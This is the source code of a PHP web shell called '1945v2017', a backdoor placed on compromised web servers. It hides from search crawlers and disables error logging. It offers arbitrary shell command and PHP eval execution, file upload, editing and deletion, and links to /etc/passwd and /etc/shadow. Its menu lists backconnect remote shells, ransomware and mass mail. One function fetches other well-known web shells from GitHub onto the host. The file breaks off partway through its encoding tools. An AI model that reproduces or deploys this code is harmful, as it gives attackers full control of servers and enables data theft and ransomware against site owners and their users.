<?php
/**
@ 1945v2017
@ author : shutdown57 a.k.a alinko
@ codename : merdekaAtoeMati
@ release date : 17 Agustus 2017
@ contact : indonesianpeople.shutdown57@gmail.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!!!~~~~~~~~~~~~~~~ Reference ~~~~~~~~~~~~~~~~~~~~!!!

~ google.com - pastebin.com - github.com - php.net
~ sourceforge.net - tutorialspoint.com - adminer.org
~ indoxploit.or.id - linuxcode.org - devilzc0de.com
~ madleets.com - linuxsec.org 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
session_start();
ob_start();
error_reporting(0);
set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

if(!empty($_SERVER['HTTP_USER_AGENT'])) { // dissallow from this array userAgent (redirect 404 page)
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
@define('ver', '2017');
@define('host',$_SERVER['HTTP_HOST']);
@define('title','1945v'.ver.'-'.host);

$usernm_1945 = "1945"; // default username : 1945
$passwd_1945 = "f509e5b1aa24c8222241883261555ed5"; // default password ; merdeka , change with md5 hash
$session_name = md5($_SERVER['HTTP_HOST']."_session_1945"); // session name

function login_1945_merdekaataoemati()
{
	echo "<div style=\"margin-top:250px;\" align=center><h3>1945v2017 - Login</h3></div>";
	echo "<form method=\"POST\"><table align=center ><tr><td>";
	echo "Username :</td><td><input type=\"text\" name=\"usernm_1945\"></td></tr><tr>";
	echo "<td>Password :</td><td><input type=\"password\" name=\"passwd_1945\"></td></tr><tr><td colspan=2>";
	echo "<input type=\"submit\" value=\">>\"></td></tr></table></form>";
exit;
}
if(!isset($_SESSION[$session_name])){if(empty($passwd_1945)||(empty($usernm_1945))||(isset($_POST['passwd_1945'])&&(md5($_POST['passwd_1945']))==$passwd_1945)&&(isset($_POST['usernm_1945'])&&($_POST['usernm_1945'])==$usernm_1945)){$_SESSION[$session_name]=true;}else{login_1945_merdekaataoemati();}}

class Html45{public function show($str){return print($str);}public function h1($t){$h= "<h1>";$h.= $t;$h.="</h1>";return $h;
	}public function th($t){$th="<th>";$th.=$t;$th.="</th>";return $th;}public function tr($t){$tr ="<tr>";$tr.=$t;$tr.="</tr>";return $tr;}public function td($t){$td = "<td>";$td.= $t;$td.="</td>";return $td;}public function html($tytyd){
		$html ="<!DOCTYPE HTML><html><head>";$html.="<title>".$tytyd."</title>";$html.="<link rel=\"icon\" href=\"http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif\">";$html.="<link href=\"https://fonts.googleapis.com/css?family=Raleway\" rel=\"stylesheet\"> ";$html.="<style>*{font-family:Raleway;}body{font-size:13px;background:#000;color:#fff;}.a_exp{border:1px solid #f00;border-collapse: collapse;width:100%}.a_exp tr:hover{background:#f00;}.a_exp tr:nth-child(even){background:#222}.a_exp tr:nth-child(even):hover{background:#f00} a{text-decoration: none;color:#fff;}.a_exp a{color:#fff;}.a_exp a:hover{text-decoration: underline;}.a_exp th{background:#fff;color:#f00;font-weight:bold}a:hover{border-bottom:1px solid #f00;}.input_m{border:1px solid #f00;color:#fff;width:250px;background:#000}.submit_m{color:#fff;border:1px solid #f00;background:#000}.submit_m:hover{border:1px solid #fff}.input_m:hover,.input_m:focus{border-bottom:1px solid #fff}.txtarea_m{margin-left:30px;border:0;border-left:2px solid #f00;color:#fff;width:98%;height:360px;background:#000}.code{margin-left:40px;border-left:2px solid #fff}.table .kiri{border-right:2px solid #fff;padding-right:30px;}ul{list-style:none;background:#333;width:100%;}ul li{padding:5px;display:inline-block;}.action{margin-left:40px;border-left:2px solid #fff;padding:2px}.table{font-size:13px}.kuchiyose{background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_map_of_Indonesia.svg/2000px-Flag_map_of_Indonesia.svg.png');background-size:cover;background-attachment:fixed;height:700px;text-shadow:0px 2px 4px #000;}.kuchiyose ul{list-style:none;background:transparent;}hr{border:1px solid #fff}</style>";$html.="<meta name=\"author\" content=\"shutdown57 a.k.a alinko\">";$html.="</head><body>";return $html;}public function a($href,$displ,$attr){$a="<a href=\"".$href."\" ".$attr.">";$a.=wordwrap($displ,60,"\n",TRUE);$a.="</a>";return $a;}public function pre($c){$p = "<pre>";$p.= $c;$p.= "</pre>";return $p;}public function form($method,$input){$form = "<form method=\"".$method."\">";$form.= $input;$form.= "</form>";return $form;}public function input($type,$name,$attr,$label){$input = "<label for=\"".$name."\">".$label."</label> : ";$input.= "<input type=\"".$type."\"";$input.= "name=\"".$name."\"";$input.= $attr;$input.= " class=\"input_m\">";return $input;}public function submit($name,$attr){$sbmt = "<input type=\"submit\"";$sbmt.= "name=\"".$name."\"";$sbmt.= $attr;$sbmt.= " class=\"submit_m\">";return $sbmt;}public function textarea($name,$content,$attr){$txt = "<textarea name=\"".$name."\"";$txt.= "class=\"txtarea_m\"";$txt.=$attr;$txt.=">";$txt.= $content;$txt.="</textarea>";return $txt;}public function actdone(){$this->show("<div class=\"alert_m\"><b>has a job well done !</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function actfail(){$this->show("<div class=\"alert_x\"><b>the task could not be finished :( , Something Wrong!</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function ul($l){$li = "<ul>";$li.= $l;$li.= "</ul>";return $li;}public function li($ll){$ul = "<li>";$ul.= $ll;$ul.= "</li>";return $ul;}public function select($name,$opt,$o){$s = "<select name=\"".$name."\" ".$o.">";$s.= $opt;$s.= "</select>";return $s;}public function option($val,$sh){$o="<option value=\"".$val."\">";$o.=$sh;$o.="</option>";return $o;}public function footer(){$foot = "<div style=\"margin-top:69px;\" align=\"center\">";$foot.= "copyright &copy; ".date('Y');$foot.= " indonesianpeople | 1945v2017 by :";$foot.= $this->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"");$foot.= "</div>";return $foot;}}
class FileMan45{public function Spath(){if(isset($_GET['__merdeka__'])){$d = $_GET['__merdeka__'];}else{if(isset($_GET['__files__'])){$d = dirname($_GET['__files__']);}else{if(function_exists('getcwd')){$d = getcwd();}else{$d = __DIR__;}}}return $d;}public function ScanDir($p){
		if(function_exists('scandir')){$s = scandir($p);}else{echo "<pre>";$s=system('ls -lia');echo "</pre>";}
		return $s;}public function getfsize($files){$size = filesize($files)/1024;$size = round($size,3);if($size > 1024){$size = round($size/1024,2). 'MB';} else {$size = $size. 'KB';}return $size;}public function getfilemtime($f){$a_fdm=@date("D m Y g:i:s", filemtime($f));return $a_fdm;}public function getmime($f){if(function_exists('mime_content_type')){if(is_readable($f)){$mime = mime_content_type($f);}else{$mime = "Unknown";}}else{if(is_dir($f)){$mime="Directory";}elseif(is_file($f)){$mime="Files";}else{$mime="Unknown";}}return $mime;}public function getowner($path){if(function_exists('posix_getpwuid')) {$downer = @posix_getpwuid(fileowner($path));$downer = $downer['name'];} else {$downer = fileowner($path);}return $downer;}public function getgroup($path){if(function_exists('posix_getgrgid')) {$dgrp = @posix_getgrgid(filegroup($path));$dgrp = $dgrp['name'];} else { $dgrp = filegroup($path);}return $dgrp;} public function getperms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info;}public function viewfile($f){$file = wordwrap(file_get_contents($f),150,"\n",true);$a= highlight_string($file,true);$old = array("0000BB","000000","FF8000","DD0000", "007700");$new = array("81FF00","e1e1e1", "333333", "ffffff" , "FF8000");$a= str_ireplace($old,$new, $a);$result = "<div class=\"code\">";$result .= $a;$result.="</div>";return $result;}public function currentdir($path,$goto){$dir = str_replace("\\","/",$path);$dir = explode("/",$dir);foreach($dir as $o=>$i){if($i == "" && $o == 0){echo "<a href='?".$goto."=/'>/</a>";continue;}if($i == "")continue;echo "<a href='?".$goto."=";for($p=0;$p<=$o;$p++){ echo $dir[$p]; if($p != $o){echo "/";} } echo "'>".$i."</a>/";}if(is_writable($path)){echo "- [<b><font color=lime>W</font></b>]";}elseif(is_readable($path)){echo "- [<b><font color=red>R</font></b>]";}else{echo "- [<b><font color=grey>Unknown</b>]";}}public function actiondir($p){$h= new Html45();$a =$h->a("?__merdeka__=".$p."&__action__=rename","ren","");$a.=" | ";$a.=$h->a("?__merdeka__=".$p."&__action__=delete","del","");$a.=" | ";$a.=$h->a("?__merdeka__=".$p."&__action__=mkdir","newDir","");$a.=" | ";$a.=$h->a("?__merdeka__=".$p."&__action__=touch","newFile","");return $a;}public function actionfile($p){$h= new Html45();$a =$h->a("?__files__=".$p."&__action__=rename","ren","");$a.=" | ";$a.=$h->a("?__files__=".$p."&__action__=delete","del","");$a.=" | ";$a.=$h->a("?__files__=".$p."&__action__=edit","edit","");$a.=" | ";$a.=$h->a("?__files__=".$p."&__action__=dl","download","");return $a;	}static function cmd($cmd){
	if(function_exists('system')) { @ob_start(); @system($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; 	} elseif(function_exists('exec')) { @exec($cmd,$results); $buff = ""; foreach($results as $result) { $buff .= $result; } return $buff; 	} elseif(function_exists('passthru')) { @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; 	} elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd); return $buff; 	} }}
class SysInfo45{public function servis(){$mysql= (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";$mysqli = (function_exists('mysqli_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";$curl = (function_exists('curl_init')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";$perl = (FileMan45::cmd('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";$py = (FileMan45::cmd('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";$sh = (FileMan45::cmd('bash --version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>"; $s = "MySQL : ";$s.= $mysql."<font color=red> | </font>";$s.= "MySQLi : ";$s.= $mysqli."<font color=red> | </font>";$s.= "CURL : ";$s.= $curl."<font color=red> | </font>";$s.= "Perl : ";$s.=$perl."<font color=red> | </font>";$s.= "Python : ";$s.= $py. "<font color=red> | </font>";$s.= "Bash : ";$s.= $sh. "";return $s;}public function ipsercli(){$ip = "IP Server : ";$ip.= gethostbyname($_SERVER['HTTP_HOST']);$ip.= " <font color=red>|</font> ";$ip.= "IP Client : ";$ip.= $_SERVER['REMOTE_ADDR'];return $ip;}public function usergroup($p){if(!function_exists('posix_getegid')) {$user = @get_current_user();$uid = @getmyuid();$gid = @getmygid();$group = "?";} else {$uid = @posix_getpwuid(posix_geteuid());$gid = @posix_getgrgid(posix_getegid());$user = $uid['name'];$uid = $uid['uid'];$group = $gid['name'];$gid = $gid['gid'];}$u = "User :<b> ".$user."</b> [".$uid."] <font color=red>||</font> Group :<b> ".$group."</b> [".$gid."]";return $u;}public function gethost(){$host = $_SERVER['HTTP_HOST'];$h = "Hostname : ";$h .= preg_replace("/^www./","",$host);return $h;}
	public function gethddsize($s){if($s >= 1073741824)return sprintf('%1.2f',$s / 1073741824 ).' GB';elseif($s >= 1048576)return sprintf('%1.2f',$s / 1048576 ) .' MB';elseif($s >= 1024)return sprintf('%1.2f',$s / 1024 ) .' KB';else return $s .' B';}public function disablefunc(){
		if(ini_get('disable_functions')){$df=wordwrap(ini_get('disable_functions'),100,"\n",true);}else{$df=" <font color=red>NONE :)</font>";}return $df;}public function hddsize($p){$hdd = "HDD : ";$hdd.= $this->gethddsize(disk_total_space($p)) - $this->gethddsize(diskfreespace($p));$hdd.= " / ";$hdd.= $this->gethddsize(disk_total_space($p));$hdd.= " | ";$hdd.= "[<b> Free : ";$hdd.= $this->gethddsize(diskfreespace($p));$hdd.= "</b> ]";return $hdd;}public function uname(){$uname = "Uname :";$uname.= php_uname();return $uname;}public function phpv(){$php = "PHP Version :";$php.= phpversion();return $php;}public function SecInfo(){echo "<div style=\"font-size:13px\">";if(preg_match("/Linux/",php_uname())){$ss = "Server Software : <b>";$ss.= $_SERVER['SERVER_SOFTWARE']."</b><br>";echo $ss;if(preg_match("/Apache/",$ss)){$sz = "Apache Loaded Module : <b>";$lm = apache_get_modules();$sz.= wordwrap(implode("<b><font color=red> - </font></b>",$lm),69,"\n",true)."</b>";$sz.= "<br>";$sz.= "Apache Version : <b>";$sz.= apache_get_version()."</b><br>";echo $sz;		}$ds = "PHP Disable functions : <b>";$ds.= $this->disablefunc()."</b>";echo $ds;echo "<br><br>";$etc = "Readable /etc/passwd : ";$etc.= (is_readable("/etc/passwd")) ? "<font color=lime> YES </font>[<a href='?__files__=/etc/passwd&__action__=view'>View</a>]" : "<font color=red> NO </font>";$etc.= "<br>";$etc.= "Readable /etc/shadow : ";$etc.= (is_readable("/etc/shadow")) ? "<font color=lime> YES </font>[<a href='?__files__=/etc/shadow&__action__=view'>View</a>]" : "<font color=red> NO </font>";echo $etc;$oo = "<pre class=\"code\">";$oo.= "HDD Space :<br><b>";$oo.= FileMan45::cmd("df -h");$oo.= "</pre><pre class=\"code\">";$oo.= "Hosts : <br><b>";$oo.= FileMan45::cmd("cat /etc/hosts");$oo.= "</pre></b></b>";echo $oo;}else{echo "<center><h1>But,The System Use Windows Server :(</h1></center>";}echo "</div>";}}
class Act45{public function upload($a,$b){
		if(function_exists('move_uploaded_file')){$upl = move_uploaded_file($a,$b);}elseif (function_exists('copy')) {$upl = copy($a,$b);}return $upl; }public function simpantext($o,$k){$fp = fopen($o,"w");$o=fwrite($fp,$k);$o.=fclose($fp);return $o; } public function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach ($s as $ss) {if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm = unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}public function mkdirr($dir,$nd){if(is_writable($dir)){if(function_exists('mkdir')){$mkdir = mkdir($dir."/".$nd);}else{$mkdir = @system('mkdir '.$dir.'/'.$nd);}}return $mkdir;}public function renamet($old,$new){if(function_exists('rename')){$rename = rename($old,$new);}else{	$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,"w");$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_BINARYTRANSFER,1); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0); curl_setopt($ch, CURLOPT_FILE, $fp);return curl_exec($ch); curl_close($ch);fclose($fp);ob_flush();flush();}public function getcontent($url){    $curl = curl_init($url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);$content = curl_exec($curl);
    		curl_close($curl);return $content;}public function kuchiyose($nama){$source = array(
			"kuchiyose_wso" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php","kuchiyose_b374k"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php","kuchiyose_idx" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php","kuchiyose_ayana"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ayana.php","kuchiyose_lc" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php","kuchiyose_wa" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php","kuchiyose_1945" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/1945.php","kuchiyose_r57" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/r57.php","kuchiyose_it" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/itsec.php","kuchiyose_c99" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php","kuchiyose_ms" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/mini-shell.php","kuchiyose_symsa" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/symlinksa.php"); if(is_writable(getcwd())){if(!file_exists('1945_kcy')){$alert="Creating Directory <b>1945_kcy</b> ..."; sleep(2); if(@mkdir('1945_kcy')){$alert= "<script>alert('Directory Created !');</script><meta http-equiv='refresh' content=0;url=>";}}else{ if(!file_exists('1945_kcy/'.$nama.'.php')){if(Act45::getscript("1945_kcy/".$nama.".php",$source[$nama])){$alert= "<b><font color=lime>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : <a href='1945_kcy/".$nama.".php' target='_blank'>1945_kcy/".$nama.".php</a> <b>Successfully imported</b> ";}else{$alert ="<b><font color=red>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : 1945_kcy/".$nama.".php <b> Can't Proccess !</b>";}}else{ $alert= "<b><font color=green>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : 1945_kcy/".$nama.".php <b>Something problem !</b> ";}}}else{$alert= "Directory : <b><i>".getcwd()."</i></b><font color=red> Not Writable :(<br>";$alert.= "Can't Proccess Request !</font>";$alert.= "<script>alert('Cant Proccess Request ! - Directory not Writable!');</script>";}return $alert;}}


$html = new Html45();
$fileman = new FileMan45();
$sysfo = new SysInfo45();
$act = new Act45();
$dir = $fileman->Spath();
$scandir = $fileman->ScanDir($dir);
$no=1;
$html->show($html->html(title));
$sysinfomerdekaee ="<pre>"; $sysinfomerdekaee.=$sysfo->uname()."<br>";$sysinfomerdekaee.=$sysfo->gethost()."<br>";$sysinfomerdekaee.="Server Software : ".$_SERVER['SERVER_SOFTWARE']."<br>";$sysinfomerdekaee.="PHP Version :".phpversion()." - [<a href='?__merdeka__=$dir&__action__=infophp'>PHPINFO</a>]<br>";$sysinfomerdekaee.=$sysfo->ipsercli()."<br>";$sysinfomerdekaee.=$sysfo->hddsize($dir)."<br>";$sysinfomerdekaee.=$sysfo->usergroup($dir)."<br>";$sysinfomerdekaee.=$sysfo->servis()."<br>";$sysinfomerdekaee.="Disable functions :".$sysfo->disablefunc();$sysinfomerdekaee.="</pre>";

$html->show("<table class=\"table\">");
$html->show($html->tr($html->td("<img src=\"https://alintamvanz.github.io/images/1945/garuda.png\"  style=\"width:150px;height:150px\" class=\"kiri\">").$html->td($sysinfomerdekaee)));$html->show("</table>");$html->show("Current Dir :");$fileman->currentdir($fileman->Spath(),"__merdeka__");$html->show("<hr>");$li = $html->li("[ ".$html->a("?_","Home","")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sec","Sec. Info","System Security Info")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=cmd","Command","title=\"Execute command\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=upl","Upload","title=\"Upload file in the server\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sql","SQL","title=\"Connect to SQL\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=php#code","PHP","title=\"Execute PHP\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=ps","PS","title=\"Display Proccess status\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=str","String Tools","Encode & Decode Tools")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=net","Remote Shell","title=\"Backconnect & Bind Port\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=mail","Mail","title=\"Send email\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=rsw","Ransomeware","title=\"Carefully,with this tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=kcy","kuchiyose","title=\"come your favorite tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=adm","Admin Finder","title=\"Find admin \"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sh","CGI Shell","title=\"CGI Shell\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=telnet","CGI Telnet","title=\"CGI Telnet\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=abt","About","title=\"About\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=log","Logout","title=\"Logout And Destroy Session\"")." ]");$html->show($html->ul($li));$html->show("<hr>");
if(isset($_GET['__action__'])||isset($_GET['__files__']))
{
$__files__   = $_GET['__files__'];
$__action__ = $_GET['__action__']; 
$__merdeka__ = $_GET['__merdeka__'];
if($__action__ == "view")
{
	$html->show("<div class=\"action\">");
	$html->show("<b>Files :</b> ".$__files__."<br>");
	$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");
	$html->show("</div>");
	$html->show("<hr>");
	$html->show($html->pre($fileman->viewfile($__files__)));

}elseif ($__action__ == "mkdir") {
	$html->show($html->h1("Create New Directory"));
	$input = $html->input("text","mkdir","style=\"width:300px;\" value=\"New_dir\"","CreateNewDir").
		$html->submit("submitdir","value=\"Create !\"");
	$html->show($html->form("POST",$input));
	if(isset($_POST['submitdir']))
	{
		if($act->mkdirr($__merdeka__,$_POST['mkdir']))
		{
			$html->actdone();
		}else{
			$html->actfail();
		}
	}
}elseif ($__action__ == "delete") {
	if($__merdeka__)
	{
		$del = $__merdeka__;
	}else{
		$del = $__files__;
	}
	if($act->delete($del))
	{
		$html->show("<script>window.location.href=\"?__merdeka__=".dirname($del)."\"</script>");
	}else{
		$html->show("<script>window.location.href=\"?__merdeka__=".dirname($del)."\"</script>");
	}
}elseif ($__action__ == "rename") {
	if($__merdeka__)
	{
		$ren_f = $__merdeka__;
		$html->show("<b>Action :</b> ".$fileman->actiondir($__merdeka__)."<br>");
	}else{
		$ren_f = $__files__;
		$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");
	}
	$html->show("<b>Files :</b> ".$ren_f."<br>");
	$html->show("<hr>");
	$html->show("<center>");
	$html->show($html->h1("Rename Files / Directory"));
	$input = "<p>Oldname : <b>".basename($ren_f)."</b></p>"; 
	$input.= $html->input("text","newname","value=\"usos_1945.php\" ","newName");
	$input.= $html->submit("renamed","value=\"Save Newname\"");
	$html->show($html->form("POST",$input));
	$html->show("</center>");
	if(isset($_POST['renamed']))
	{
		if($act->renamet($ren_f,dirname($ren_f)."/".$_POST['newname']))
		{
			$html->actdone();
		}else{
			$html->actfail();
		}
	}
}elseif($__action__ == "edit")
{

	$html->show("<b>Files :</b> ".$__files__."<br>");
	$html->show("<b>Action :</b> ".$fileman->actionfile($__files__)."<br>");
	$html->show("<hr><center>");
	$html->show($html->h1("Edit files"));
	$htmlo = htmlspecialchars(file_get_contents($__files__));
	$html->show($html->form("POST",$html->textarea("editfile",$htmlo,"")."<br>".$html->submit("submitfile","value=\"Save Changes!\""))."</center>");
	if(isset($_POST['submitfile']))
	{
		if($act->simpantext($__files__,$_POST['editfile']))
		{
			$html->actdone();
		}else{
			$html->actfail();
		}
	}	
}elseif ($__action__ == "touch") {
    $html->show("<b>Create file on :</b> ".$__merdeka__."<br>");
	$html->show("<b>Action :</b> ".$fileman->actionfile($__merdeka__)."<br>");
	$html->show("<hr><center>");
	$html->show($html->h1("New files"));
	$html->show($html->form("POST",$html->textarea("newfile","# 1945v2017 c0ded by shutdown57 a.k.a alinko :*","")."<br>".
		$html->input("text","filename","value=\"newfile_1945.php\"","File Name ").
		$html->submit("submitf","value=\"Save Changes!\""))."</center>");
	if(isset($_POST['submitf']))
	{
		if($act->simpantext($__merdeka__."/".$_POST['filename'],$_POST['newfile']))
		{
			$html->actdone();
		}else{
			$html->actfail();
		}
	}	
}elseif ($__action__ == "infophp") {
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	$html->show("<center><div class=\"a_exp\">".substr($buff,$awal,$akhir-$awal)."</div></center>");
}elseif ($__action__ == "sec") {
	$sysfo->SecInfo();
}elseif ($__action__ == "cmd") {
	$html->show("<center>");
	$html->show($html->h1("Command : ".$_SERVER['HTTP_HOST']));
	$html->show("<br>");
	$input = $html->input("text","cmd","value=\"".$_POST['cmd']."\" style=\"width:600px;\"","1945@".$_SERVER['HTTP_HOST']);
	$html->show($html->form("POST",$input));
	$html->show("</center>");
	if(isset($_POST['cmd']))
	{
		$html->show("<hr>");
		$html->show("<pre class=\"code\">");
		$html->show(FileMan45::cmd($_POST['cmd']));
		$html->show("</pre>");
	}
}elseif ($__action__ == "upl") {
	$html->show("<center>".$html->h1("Upload file"));
	$html->show("<br>");
	$html->show("<form method=\"POST\" enctype=\"multipart/form-data\">");
	$s=$html->input("file","filup","style=\"border:0;width:200px\"","upload file ");
	$s.=$html->input("text","dirup","style=\"width:200px;\" value=\"".$__merdeka__."\"","Upload to ");
	$s.=$html->submit("uploadfile","value=\"Upload !!\"");
	$html->show($s);
	$html->show("</form></center>");
	if(isset($_POST['uploadfile']))
	{
		if($act->upload($_FILES['filup']['tmp_name'],$_POST['dirup']."/".$_FILES['filup']['name']))
		{
			$html->show("Successfuly Upload file : ".$_POST['dirup']."/".$_FILES['filup']['name']);
			$html->actdone();
		}else{
			$html->show("Failed to upload file !");
			$html->actfail();
		}
	}
}elseif ($__action__ == "sql") {
	if(Act45::getscript("_1945_adminer_.php","https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php"))
	{
		$html->show("<center>");
		echo "<script>window.open('_1945_adminer_.php');</script>";
		echo "Not redirected ? <a href='_1945_adminer_.php' target='_blank'> Click here nubz !</a> :'v ";
		$html->actdone();
	}else{
		$html->actfail();
		$html->show("</center>");
	}
}elseif ($__action__ == "php") {
	$val = (isset($_POST['eval'])) ? $_POST['eval'] : "echo \"HELLO Noobz! :*\";";
	$html->show("<center>");
	$html->show($html->h1("Execute php"));
	$input = $html->textarea("eval",$val,"");
	$input.= $html->submit("submitphp","value=\"Execute PHP !\" style=\"width:200px\" onsubmit=\"#code\"");
	$html->show($html->form("POST",$input));
	if(isset($_POST['submitphp'])){
	$html->show("</center><br><br><hr><div id=\"code\" class=\"code\">");
	eval($_POST['eval']);
	$html->show("</center></div>");
}
}elseif ($__action__ == "ps") {
	$html->show("<center>");
	$html->show($html->h1("Proccess Status"));
	$html->show("</center><div class=\"code\">");
	$c = (preg_match("/Linux/",php_uname())) ? "ps aux" : "tasklist /V /FO csv";
	$html->show($html->pre(FileMan45::cmd($c)));
	$html->show("</center></div>");	
}elseif ($__action__ == "str") {
	$str_a = array(
		"url"=>"URL",
		"cuu"=>"convert_uu",
		"b64"=>"base64",
		"b64b64"=>"base64 -> base64",
		"b64url"=>"base64 -> url",
		"b64str"=>"bas64 -> str_rot13",
		"b64strgz"=>"base64 -> str_rot13 -> gzinflate",
		"b64cuu"=>"base64 -> convert_uu",
		""=>">---------[ Hash ]---------<",
		"md2"=>"MD2",
		"md4"=>"MD4",
		"md5"=>"MD5",
		"sha1"=>"SHA1",
		"sha256"=>"SHA256",
		"sha384"=>"SHA384",
		"sha512"=>"SHA512",
		"crypt"=>"crypt",
		"mdmd5"=>"MD5 -> MD5",
		""=>"");
	$html->show("<br>");
foreach($str_a as $str=>$val)
{
	$opt.=$html->option($str,$val);
}

if(isset($_POST['encode'])){
	$o = $_POST['mode'];
	switch ($o) {case 'url':$val = urlencode($_POST['str']);break;case 'b64':$val = base64_encode($_POST['str']);break;case 'cuu':$val = convert_uuencode($_POST['str']);break;case 'b64b64':$val = base64_encode(base64_encode($_POST['str']));break;case 'b64str':$val = base64_encode(str_rot13($_POST['str']));break;case 'b64url':$val = base64_encode(urlencode($_POST['str']));break;case 'b64strgz':$val = base64_encode(str_rot13(gzdeflate($_POST['str'])));break;case 'b64cuu':$val = base64_encode(convert_uuencode($_POST['str']));break;default:$val = $_POST['str'];break;
	}
}
